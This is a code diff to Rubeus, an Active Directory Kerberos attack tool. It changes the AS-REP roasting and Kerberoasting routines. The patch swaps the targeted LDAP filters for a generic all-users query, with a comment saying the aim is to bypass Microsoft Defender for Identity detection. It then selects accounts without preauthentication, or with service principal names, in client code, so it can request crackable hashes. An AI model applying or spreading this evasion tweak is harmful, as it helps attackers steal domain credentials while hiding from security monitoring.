@@ -41,6 +41,7 @@ namespace Rubeus
             }
             else
             {
+				/*
                 string userSearchFilter = "";
 
                 if (String.IsNullOrEmpty(userName))
@@ -60,6 +61,11 @@ namespace Rubeus
                 {
                     domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                 }
+				*/
+
+				// hardcoded LDAP query to request all users without any filtering to bypass MDI detection
+				string userSearchFilter = "(&(objectCategory=person)(objectClass=user))";
+
                 List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);
 
                 if (users == null)
@@ -76,10 +82,17 @@ namespace Rubeus
                 {
                     string samAccountName = (string)user["samaccountname"];
                     string distinguishedName = (string)user["distinguishedname"];
-                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
-                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
 
-                    GetASRepHash(samAccountName, domain, domainController, format, outFile);
+					// get UserAccountControl as int
+					int uac = (int)user["useraccountcontrol"];
+
+					// check if UserAccountControl has DontReqPreAuth flag set if yes: request hash else: continue
+                    if (uac >= 4194304 && uac < 8388608)
+                    {
+                        Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
+                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
+                        GetASRepHash(samAccountName, domain, domainController, format, outFile);
+                    }
                 }
             }
 
@@ -328,6 +341,7 @@ namespace Rubeus
                 // build LDAP query
                 string userFilter = "";
 
+				/*
                 if (!String.IsNullOrEmpty(userName))
                 {
                     if (userName.Contains(","))
@@ -351,6 +365,7 @@ namespace Rubeus
                     // if no user specified, filter out the krbtgt account and disabled accounts
                     userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                 }
+				*/
 
                 string encFilter = "";
                 if (String.Equals(supportedEType, "rc4opsec"))
@@ -376,6 +391,7 @@ namespace Rubeus
                 //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
                 //      so this fine-grained filtering is not needed
 
+				/*
                 string userSearchFilter = "";
                 if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
                 {
@@ -412,6 +428,10 @@ namespace Rubeus
                 {
                     userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                 }
+				*/
+
+				// hardcoded LDAp query to request all users
+				string userSearchFilter = "(&(objectCategory=person)(objectClass=user))";
 
                 List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);
                 if (users == null)
@@ -440,8 +460,17 @@ namespace Rubeus
                     {
                         string samAccountName = (string)user["samaccountname"];
                         string distinguishedName = (string)user["distinguishedname"];
-                        string servicePrincipalName = ((string[])user["serviceprincipalname"])[0];
+                        string servicePrincipalName = "";
 
+                        // if servicePrincipalName is set roast user else continue with next user
+                        try
+                        {
+                            servicePrincipalName = ((string[])user["serviceprincipalname"])[0];
+                        }
+                        catch
+                        {
+                            continue;
+                        }
 
                         DateTime? pwdLastSet = null;
                         if (user.ContainsKey("pwdlastset"))
